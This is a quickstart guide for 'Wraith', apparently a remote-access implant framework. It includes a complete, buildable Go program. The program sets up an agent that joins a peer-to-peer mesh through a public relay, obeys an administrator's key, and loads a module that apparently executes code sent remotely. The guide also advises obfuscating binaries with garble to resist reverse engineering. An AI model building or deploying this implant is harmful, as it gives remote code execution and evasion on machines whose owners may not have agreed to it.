# Wraith Quickstart Guide

## Introduction

Wraith is a framework and, as such, binaries are not provided. 

Instead, the user is expected to confirgure the Wraith via a small Go file, and build their own binary. This approach allows for more flexibility in terms of configuration and compilation targets and parameters.

It also slightly raises the bar for entry, eliminating a good portion of script kiddies from the user base.

Of course, this does require that a Go toolchain is installed to initially build a Wraith binary before deployment. This is unfortunate, but overall the benefits seem to outweigh the drawbacks.

To install the Go toolchain, see https://go.dev/doc/install.

## Example

Below is an example Go file which produces a working Wraith. It should give you a good starting point.

The file can be built by invoking the `go build` command with the name of the file as the first and only parameter. Make sure to `go get` any non-standard dependencies first. In case of the below code, that would be everything going down from and including `"dev.l1qu1d.net/wraith-labs/wraith/wraith/libwraith"` in the import statement.

More advanced users may wish to use a tool like [garble](https://github.com/burrowers/garble) to make their binaries harder to reverse-engineer.

```go
package main

import (
	"context"
	"crypto/ed25519"
	"encoding/hex"
	"os"
	"os/signal"
	"syscall"
	"time"

	"dev.l1qu1d.net/wraith-labs/wraith/wraith/libwraith"

	moduleexecgo "dev.l1qu1d.net/wraith-labs/wraith-module-execgo"
	modulepinecomms "dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms"
)

const RESPECT_EXIT_SIGNALS = true

var exitTrigger chan struct{}

func setupCloseHandler(triggerChannel chan struct{}) {
	c := make(chan os.Signal, 2)
	signal.Notify(
		c,
		syscall.SIGHUP,
		syscall.SIGINT,
		syscall.SIGQUIT,
		syscall.SIGTERM,
	)
	if RESPECT_EXIT_SIGNALS {
		go func() {
			for range c {
				triggerChannel <- struct{}{}
			}
		}()
	}
}

func init() {
	exitTrigger = make(chan struct{})
	setupCloseHandler(exitTrigger)
}

func main() {
	// Create Wraith
	w := libwraith.Wraith{}

	// Create context for Wraith
	ctx, ctxCancel := context.WithCancel(context.Background())

	// Prepare some config values
	_, ownPrivKey, _ := ed25519.GenerateKey(nil)
	adminPubKey, _ := hex.DecodeString("0d1b9de8a9a2fe6cc30f45fd950d9722bf6d7e1687d18493e1a65e65cb94dd48") // REPLACE THIS WITH YOUR OWN PUBLIC KEY

	// Start Wraith in goroutine
	go w.Spawn(
		ctx,
		libwraith.Config{
			StrainId:                   "none",
			HeartbeatTimeout:           1 * time.Second,
			ModuleCrashloopDetectCount: 3,
			ModuleCrashloopDetectTime:  30 * time.Second,
		},
		&modulepinecomms.ModulePinecomms{
			OwnPrivKey:   ownPrivKey,
			AdminPubKey:  adminPubKey,
			ListenTcp:    ":0",
			ListenWs:     ":0",
			UseMulticast: true,
			StaticPeers: []string{
				"wss://pinecone.matrix.org/public",
			},
		},
		&moduleexecgo.ModuleExecGo{},
	)

	// Wait until the exit trigger fires
	<-exitTrigger

	// Kill Wraith and exit
	ctxCancel()
	time.Sleep(1 * time.Second) // wait to make sure everything has cleaned itself up
}
```
